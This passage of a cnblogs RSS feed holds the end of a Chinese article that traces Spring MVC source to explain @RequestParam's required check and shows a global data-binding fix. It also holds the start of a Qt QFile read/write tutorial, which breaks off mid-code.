doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
filterAndRecordMetrics:114, WebMvcMetricsFilter (org.springframework.boot.actuate.metrics.web.servlet)
doFilterInternal:104, WebMvcMetricsFilter (org.springframework.boot.actuate.metrics.web.servlet)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:200, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:202, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:490, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:139, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:408, Http11Processor (org.apache.coyote.http11)
process:66, AbstractProcessorLight (org.apache.coyote)
process:853, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1587, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;聚集重点在请求参数的读取校验方面，首先看&lt;code&gt;org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver&lt;/code&gt;类的resolveArgument方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
@Nullable
public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer,
                NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception {

    // 留意此方法调用
        NamedValueInfo namedValueInfo = getNamedValueInfo(parameter);
        MethodParameter nestedParameter = parameter.nestedIfOptional();

        Object resolvedName = resolveStringValue(namedValueInfo.name);
        if (resolvedName == null) {
                throw new IllegalArgumentException(
                                &quot;Specified name must not resolve to null: [&quot; + namedValueInfo.name + &quot;]&quot;);
        }
        // 后面暂时省略
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;getNamedValueInfo&lt;/code&gt;方法的实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * Obtain the named value for the given method parameter.
 */
private NamedValueInfo getNamedValueInfo(MethodParameter parameter) {
        NamedValueInfo namedValueInfo = this.namedValueInfoCache.get(parameter);
        if (namedValueInfo == null) {
                namedValueInfo = createNamedValueInfo(parameter);
                namedValueInfo = updateNamedValueInfo(parameter, namedValueInfo);
                this.namedValueInfoCache.put(parameter, namedValueInfo);
        }
        return namedValueInfo;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;进入&lt;code&gt;createNamedValueInfo(parameter)&lt;/code&gt;方法时，这部分代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
protected NamedValueInfo createNamedValueInfo(MethodParameter parameter) {
        RequestParam ann = parameter.getParameterAnnotation(RequestParam.class);
        return (ann != null ? new RequestParamNamedValueInfo(ann) : new RequestParamNamedValueInfo());
}

/**
 * NamedValueInfo的定义
 * Represents the information about a named value, including name, whether it's required and a default value.
 */
protected static class NamedValueInfo {

        private final String name;

        private final boolean required;

        @Nullable
        private final String defaultValue;

        public NamedValueInfo(String name, boolean required, @Nullable String defaultValue) {
                this.name = name;
                this.required = required;
                this.defaultValue = defaultValue;
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这段代码很关键，这里只读取@RequestParam注解，不会读@ApiImplicitParam注解，所以@ApiImplicitParam注解不会影响@RequestParam的属性，并且无论是从swagger doc过来的请求，还是postman过来的请求，都执行这一段代码，最终读取注解的结果用CurrenctHashMap存储，key的格式是&lt;code&gt;method 'xxx' parameter y&lt;/code&gt;，xxx为方法名，y为参数的顺序号，如&lt;code&gt;method 'auth' parameter 0&lt;/code&gt;，基本上可以保证唯一性。&lt;/p&gt;
&lt;h4 id=&quot;阶段性总结&quot;&gt;阶段性总结&lt;/h4&gt;
&lt;p&gt;源码阅读到这里，基本上可以验证前面提及的小结论的前2条，引用一下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;@ApiImplicitParam的required参数不会对@RequestParam的required值造成侵入，它们俩不相关。&lt;/li&gt;
&lt;li&gt;@ApiImplicitParam的required参数会影响swagger doc的js逻辑判断，为空校验是在js层面上完成的。&lt;/li&gt;
&lt;li&gt;@RequestParam的required参数默认情况下只会校验是否有该参数名，不校验它是否有值。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;前面2个问题已经从源码中找到解释，来看第3个问题：如果参数设置required=true，但只是要求参数名存在，如果此字段是Long类型或Integer类型，写成&lt;code&gt;uid=&lt;/code&gt;或'uid'，也能通过校验，最终进入方法后，还是得手动写代码进行为空校验，这显然不是我们想要的结果？该如何解决呢？&lt;/p&gt;
&lt;h3 id=&quot;请求参数data-bind的问题&quot;&gt;请求参数data bind的问题&lt;/h3&gt;
&lt;p&gt;接上一节，如果这样通用的参数，得挨个判断是否为空，这样的做法就有点难受了，有没有更好的解决办法呢？预期的实现效果是字段加上require=true后，Long类型或其他数值类型可以把&quot;&quot;，null过滤掉，要不然require还有什么意义呢？&lt;/p&gt;
&lt;p&gt;解决方法有两个思路：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;POST请求方法中将多个参数封装到一个POJO类里，用@RequestBody声明，POJO类中可以使用@Validator框架的@NotNull等注解，并在参数前声明@Valid。&lt;/li&gt;
&lt;li&gt;自定义参数绑定规则扩展。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;方案2更通用一些，适用GET、POST请求，并且原有的单个参数声明无需封装到POJO类里。&lt;/p&gt;
&lt;p&gt;官网本身提供自定义参数绑定的扩展，见&lt;code&gt;https://docs.spring.io/spring/docs/5.1.8.RELEASE/spring-framework-reference/web.html#mvc-ann-initbinder&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;官网的例子是在指定的Controller类中使用@InitBinder注解，影响范围仅限该Controller类，示例如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@InitBinder
public void initBinder(WebDataBinder binder) {
        /*
         * 注册对于String类型参数对象的属性进行trim操作的编辑器,
         * 构造参数代表空串是否转为null，false，则将null转为空串。
         */
        binder.registerCustomEditor(String.class, new StringTrimmerEditor(false));
        // 这里我还添加了其他类型的属性编辑器，true表示允许使用&quot;&quot;，并且将&quot;&quot;处理为空，false表示不允许使用&quot;&quot;
        binder.registerCustomEditor(Short.class, new CustomNumberEditor(Short.class, false));
        binder.registerCustomEditor(Integer.class, new CustomNumberEditor(Integer.class, false));
        binder.registerCustomEditor(Long.class, new CustomNumberEditor(Long.class, false));
        binder.registerCustomEditor(Float.class, new CustomNumberEditor(Float.class, false));
        binder.registerCustomEditor(Double.class, new CustomNumberEditor(Double.class, false));
        binder.registerCustomEditor(BigDecimal.class, new CustomNumberEditor(BigDecimal.class, false));
        binder.registerCustomEditor(BigInteger.class, new CustomNumberEditor(BigInteger.class, false));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于此次面临的问题是全模块@RequestParam的值的问题，需要做一个全局的配置，此时需要新增一个类，并使用@ControllerAdvice注解，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@ControllerAdvice
public class CustomWebBindingInitializer implements WebBindingInitializer {

        @InitBinder
        @Override
        public void initBinder(WebDataBinder binder) {
                /*
                 * 注册对于String类型参数对象的属性进行trim操作的编辑器,
                 * 构造参数代表空串是否转为null，false，则将null转为空串。
                 */
                binder.registerCustomEditor(String.class, new StringTrimmerEditor(false));
                // 这里我还添加了其他类型的属性编辑器，true表示允许使用&quot;&quot;，并且将&quot;&quot;处理为空，false表示不允许使用&quot;&quot;
                binder.registerCustomEditor(Short.class, new CustomNumberEditor(Short.class, false));
                binder.registerCustomEditor(Integer.class, new CustomNumberEditor(Integer.class, false));
                binder.registerCustomEditor(Long.class, new CustomNumberEditor(Long.class, false));
                binder.registerCustomEditor(Float.class, new CustomNumberEditor(Float.class, false));
                binder.registerCustomEditor(Double.class, new CustomNumberEditor(Double.class, false));
                binder.registerCustomEditor(BigDecimal.class, new CustomNumberEditor(BigDecimal.class, false));
                binder.registerCustomEditor(BigInteger.class, new CustomNumberEditor(BigInteger.class, false));
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意一下CustomNumberEditor实例初始化的传的false参数。&lt;/p&gt;
&lt;p&gt;重启应用，看一下效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/f1591a28-ec42-43f0-a2c8-d024df1f7f9d.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;扩展databinder后相关源码阅读&quot;&gt;扩展DataBinder后相关源码阅读&lt;/h3&gt;
&lt;p&gt;都已经到这儿了，再加把劲把相关的源码看一下，还是在&lt;code&gt;org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver&lt;/code&gt;类的resolveArgument方法的后半段：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
@Nullable
public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer,
                NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception {
    // 前面省略
        if (binderFactory != null) {
                WebDataBinder binder = binderFactory.createBinder(webRequest, null, namedValueInfo.name);
                try {
                    // 在这里对参数进行转换
                        arg = binder.convertIfNecessary(arg, parameter.getParameterType(), parameter);
                }
                catch (ConversionNotSupportedException ex) {
                        throw new MethodArgumentConversionNotSupportedException(arg, ex.getRequiredType(),
                                        namedValueInfo.name, parameter, ex.getCause());
                }
                catch (TypeMismatchException ex) {
                        throw new MethodArgumentTypeMismatchException(arg, ex.getRequiredType(),
                                        namedValueInfo.name, parameter, ex.getCause());

                }
        }

        handleResolvedValue(arg, namedValueInfo.name, parameter, mavContainer, webRequest);

        return arg;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从&lt;code&gt;binder.convertIfNecessary&lt;/code&gt;方法一路跟下去，中间省略一些调用，最终到达&lt;code&gt;org.springframework.beans.propertyeditors.CustomNumberEditor&lt;/code&gt;类的setAsText方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * Parse the Number from the given text, using the specified NumberFormat.
 */
@Override
public void setAsText(String text) throws IllegalArgumentException {
        if (this.allowEmpty &amp;amp;&amp;amp; !StringUtils.hasText(text)) {
                // Treat empty String as null value.
                setValue(null);
        }
        else if (this.numberFormat != null) {
                // Use given NumberFormat for parsing text.
                setValue(NumberUtils.parseNumber(text, this.numberClass, this.numberFormat));
        }
        else {
                // Use default valueOf methods for parsing text.
                setValue(NumberUtils.parseNumber(text, this.numberClass));
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;仔细看allowEmpty变量，针对Long类型的参数，我们扩展数据绑定时，该变量设置的是false，表示不接受空值，试验中我们传的值是空串，那么这里的条件分支判断就必须对空串转换成数值，执行&lt;code&gt;Long.valueOf(&quot;&quot;)&lt;/code&gt;结果报出运行时异常java.lang.NumberFormatException，告知客户端参数不对，这是期望的结果。&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;
&lt;p&gt;本篇以实际的研发排错过程为出发点，刚开始自己也以为@ApiImplicitParam对@RequestParam的required属性的有侵入性，觉得诧异便深入源码论证自己的想法，经阅读源码后发现事实并不是这样，是刚开始我们对required的理解有误。既然required的作用非常有限，那么肯定能找到通用的解决方案避免手动写代码对所有参数进行为空判断，这些解决一个问题后，发现新的问题，再继续解决，最终得到的结果，分析若有不详尽之处，请指正，谢谢。&lt;/p&gt;
&lt;p&gt;专注Java高并发、分布式架构，更多技术干货分享与心得，请关注公众号：Java架构社区&lt;br/&gt;可以扫左边二维码添加好友，邀请你加入Java架构社区微信群共同探讨技术&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1834889/202003/1834889-20200303074927076-1724862603.jpg&quot; alt=&quot;Java架构社区&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 08 Jul 2020 23:29:00 +0000</pubDate>
<dc:creator>清茶豆奶</dc:creator>
<og:description>问题起源 使用SpringCloud构建项目时，使用Swagger生成相应的接口文档是推荐的选项，Swagger能够提供页面访问，直接在网页上调试后端系统的接口， 非常方便。最近却遇到了一个有点困惑的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/huangying2124/p/13270358.html</dc:identifier>
</item>
<item>
<title>Qt-文件系统 - zhengcixi</title>
<link>http://www.cnblogs.com/mrlayfolk/p/13270116.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mrlayfolk/p/13270116.html</guid>
<description>&lt;h3&gt;&lt;span&gt;1 简介&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;参考视频：&lt;a href=&quot;https://www.bilibili.com/video/BV1XW411x7NU?p=45&quot;&gt;https://www.bilibili.com/video/BV1XW411x7NU?p=45&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;参考文档：《Qt教程.docx》&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;说明：本文主要介绍Qt的文件系统。&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;2 知识点&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;Qt&lt;/span&gt;&lt;span&gt;通过&lt;span lang=&quot;EN-US&quot;&gt;QIODevice&lt;/span&gt;提供了对 &lt;span lang=&quot;EN-US&quot;&gt;I/O&lt;/span&gt; 设备的抽象，这些设备具有读写字节块的能力。下面是 &lt;span lang=&quot;EN-US&quot;&gt;I/O&lt;/span&gt; 设备的类图（&lt;span lang=&quot;EN-US&quot;&gt;Qt5&lt;/span&gt;）：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1078885/202007/1078885-20200708223045159-675018350.png&quot; alt=&quot;&quot; width=&quot;540&quot; height=&quot;262&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;ul readability=&quot;8&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QIODevice&lt;/span&gt;&lt;span&gt;：所有 &lt;span lang=&quot;EN-US&quot;&gt;I/O&lt;/span&gt; 设备类的父类，提供了字节块读写的通用操作以及基本接口；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QFileDevice&lt;/span&gt;&lt;span&gt;：&lt;span lang=&quot;EN-US&quot;&gt;Qt5&lt;/span&gt;新增加的类，提供了有关文件操作的通用实现。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QFlie&lt;/span&gt;&lt;span&gt;：访问本地文件或者嵌入资源；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QTemporaryFile&lt;/span&gt;&lt;span&gt;：创建和访问本地文件系统的临时文件；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QBuffer&lt;/span&gt;&lt;span&gt;：读写&lt;span lang=&quot;EN-US&quot;&gt;QbyteArray,&lt;/span&gt; 内存文件；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QProcess&lt;/span&gt;&lt;span&gt;：运行外部程序，处理进程间通讯；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QAbstractSocket&lt;/span&gt;&lt;span&gt;：所有套接字类的父类；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QTcpSocket&lt;/span&gt;&lt;span&gt;：&lt;span lang=&quot;EN-US&quot;&gt;TCP&lt;/span&gt;协议网络数据传输；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QUdpSocket&lt;/span&gt;&lt;span&gt;：传输 &lt;span lang=&quot;EN-US&quot;&gt;UDP&lt;/span&gt; 报文；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;1&quot; readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QSslSocket&lt;/span&gt;&lt;span&gt;：使用 &lt;span lang=&quot;EN-US&quot;&gt;SSL/TLS&lt;/span&gt; 传输数据；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;3 基本文件操作&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QFile&lt;/span&gt;&lt;span&gt;提供了从文件中读取和写入数据的能力。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;span&gt;我们通常会将文件路径作为参数传给&lt;span lang=&quot;EN-US&quot;&gt;QFile&lt;/span&gt;的构造函数。不过也可以在创建好对&lt;/span&gt;&lt;span&gt;象最后，使用&lt;span lang=&quot;EN-US&quot;&gt;setFileName()&lt;/span&gt;来修改&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QFile&lt;/span&gt;&lt;span&gt;主要提供了有关文件的各种操作，比如打开文件、关闭文件、刷新文件&lt;/span&gt;&lt;span&gt;等。我们可以使用&lt;span lang=&quot;EN-US&quot;&gt;QDataStream&lt;/span&gt;或&lt;span lang=&quot;EN-US&quot;&gt;QTextStream&lt;/span&gt;类来读写文件，也可以使用&lt;/span&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;QIODevice&lt;/span&gt;类提供的&lt;span lang=&quot;EN-US&quot;&gt;read()&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;readLine()&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;readAll()&lt;/span&gt;以及&lt;span lang=&quot;EN-US&quot;&gt;write()&lt;/span&gt;这样的函数。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span&gt;&lt;span&gt;值得注意的是，有关文件本身的信息，比如文件名、文件所在目录的名字等，则&lt;/span&gt;&lt;span&gt;是通过&lt;span lang=&quot;EN-US&quot;&gt;QFileInfo&lt;/span&gt;获取，而不是自己分析文件路径字符串。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;4  测试&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;（1）打开、读取、写入文件&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;功能：创建两个按钮，“read file”按钮打开一个文本框，读取文件的内容到textEdit；“save file”按钮将textEdit中的内容保存到一个文件中。界面如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1078885/202007/1078885-20200708224041082-1028790939.png&quot; alt=&quot;&quot; width=&quot;282&quot; height=&quot;237&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;读取文件使用到的函数和步骤：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1）创建一个文件对象：&lt;/span&gt;&lt;span&gt;&lt;span&gt;QFile&lt;/span&gt;&lt;span&gt;file&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;path&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2）以只读方式打开文件：&lt;/span&gt;&lt;span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt;isOk&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;file&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;open&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;QIODevice&lt;/span&gt;&lt;span&gt;::&lt;/span&gt;&lt;span&gt;ReadOnly&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3）读取文件的内容有多种方式，这里介绍两种：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;一次性读取文件全部内容：&lt;/span&gt;&lt;span&gt;&lt;span&gt;QByteArray&lt;/span&gt;&lt;span&gt;array&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;file&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;readAll&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;一次只读取一行：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;1&lt;/span&gt; QByteArray array;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;while&lt;/span&gt; (file.atEnd() == &lt;span&gt;false&lt;/span&gt;) {
&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;读一行&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt;     array += file.readLine();
&lt;span&gt;5&lt;/span&gt; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;4）关闭文件：&lt;/span&gt;file&lt;span&gt;.&lt;/span&gt;&lt;span&gt;close&lt;/span&gt;&lt;span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;写入文件用到的函数和步骤：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1）创建文件对象：QFile&lt;/span&gt;&lt;span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;file&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2）关联文件名字：file&lt;span&gt;.&lt;/span&gt;&lt;span&gt;setFileName&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;path&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3）以只写方式打开文件：bool&lt;span&gt; &lt;/span&gt;&lt;span&gt;isOK&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;file&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;open&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;QIODevice&lt;/span&gt;&lt;span&gt;::&lt;/span&gt;&lt;span&gt;WriteOnly&lt;/span&gt;&lt;span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;4）向文件中写入内容：&lt;/span&gt;file.write(str);&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;5）关闭文件：&lt;span&gt;file.&lt;span&gt;close&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;完整代码：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('8b62af65-b1f7-4c1a-ab58-f4a24ecd55cb')&quot; readability=&quot;36&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_8b62af65-b1f7-4c1a-ab58-f4a24ecd55cb&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_8b62af65-b1f7-4c1a-ab58-f4a24ecd55cb&quot; class=&quot;code_img_opened&quot;/&gt;&lt;/span&gt;
&lt;div id=&quot;cnblogs_code_open_8b62af65-b1f7-4c1a-ab58-f4a24ecd55cb&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;67&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt; 1&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ui_widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; #include &amp;lt;QFile&amp;gt;
&lt;span&gt; 4&lt;/span&gt; #include &amp;lt;QFileDialog&amp;gt;
&lt;span&gt; 5&lt;/span&gt; #include &amp;lt;QByteArray&amp;gt;
&lt;span&gt; 6&lt;/span&gt; #include &amp;lt;QByteArray&amp;gt;
&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt; Widget::Widget(QWidget *&lt;span&gt;parent) :
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;    QWidget(parent),
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     ui(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Ui::Widget)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     ui-&amp;gt;setupUi(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt; Widget::~&lt;span&gt;Widget()
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    delete ui;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::on_pushButton_read_clicked()
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     QString path = QFileDialog::getOpenFileName(&lt;span&gt;this&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;open&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TXT(*.txt)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
